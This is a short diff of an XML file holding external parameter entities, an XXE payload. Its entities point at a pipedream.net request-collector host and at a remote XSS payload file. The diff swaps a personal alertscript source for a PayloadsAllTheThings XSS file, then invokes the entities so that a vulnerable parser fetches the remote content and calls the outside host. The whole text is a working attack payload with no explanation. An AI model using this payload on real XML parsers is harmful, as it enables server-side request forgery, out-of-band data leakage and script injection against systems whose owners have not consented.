@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8" ?>
 <!ENTITY % abc SYSTEM "https://enllfgxx7hk1e.x.pipedream.net/openredir">
-<!ENTITY % def SYSTEM "https://raw.githubusercontent.com/SamWinc/MyFiles/master/alertscript.html">
+<!ENTITY % def SYSTEM "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS Injection/Files/xss.xml">
 <!ENTITY % abcd SYSTEM "https://enllfgxx7hk1e.x.pipedream.net/get.html">
 %abc;
 %def;
